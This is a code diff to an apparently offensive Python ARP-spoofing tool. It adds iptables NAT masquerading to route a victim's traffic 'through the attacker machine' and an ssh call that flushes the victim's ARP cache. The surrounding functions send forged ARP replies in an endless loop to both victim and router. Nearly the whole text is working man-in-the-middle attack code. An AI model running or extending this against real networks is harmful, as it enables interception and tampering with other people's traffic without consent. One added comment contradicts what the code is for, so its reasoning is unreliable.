@@ -18,6 +18,20 @@ def enable_ip_forwarding():
         print(f"[!] Failed to enable IP forwarding: {e}")
 
 
+def enable_nat():
+    """
+    Enables Network Address Translation (NAT) to forward traffic through the attacker machine.
+    """
+    try:
+        # Enable IP forwarding
+        enable_ip_forwarding()
+        # Set up NAT using iptables
+        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
+        print("[*] NAT enabled using iptables.")
+    except Exception as e:
+        print(f"[!] Failed to enable NAT: {e}")
+
+
 def get_local_mac(interface="eth0"):
     """
     Retrieves the local MAC address of a given interface using socket and fcntl.
@@ -83,11 +97,23 @@ def create_arp_packet(src_mac, src_ip, target_mac, target_ip, operation=2):
     return ethernet_frame + arp_header
 
 
+def clear_arp_cache(victim_ip):
+    """
+    Clears the ARP cache on the victim machine by running a command remotely (requires root).
+    """
+    try:
+        subprocess.run(["ssh", victim_ip, "ip", "-s", "-s", "neigh", "flush", "all"])
+        print(f"[*] ARP cache cleared for victim {victim_ip}.")
+    except Exception as e:
+        print(f"[!] Failed to clear ARP cache for {victim_ip}: {e}")
+
+
 def perform_arp_spoof(victim_ip, iface="eth0"):
     """
     Performs ARP spoofing against the specified victim IP.
     """
-    enable_ip_forwarding()
+    enable_nat()  # Enable IP forwarding and NAT
+    
     # Get local MAC address
     raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0806))
@@ -116,6 +142,9 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
     print(f"[*] Victim MAC: {victim_mac} ({victim_ip})")
     print(f"[*] Router MAC: {router_mac} ({router_ip})")
 
+    # Clear victim's ARP cache to ensure it re-learns the correct MAC address
+    clear_arp_cache(victim_ip)
+
     # Create ARP spoof packets
     victim_packet = create_arp_packet(
         local_mac, router_ip, victim_mac, victim_ip)
@@ -127,7 +156,9 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
         while True:
             raw.send(victim_packet)
             raw.send(router_packet)
-            sleep(2)
+            sleep(5)  # Increase delay to prevent flooding
     except KeyboardInterrupt:
         print("\n[!] Stopping ARP spoofing.")
         raw.close()
+
+
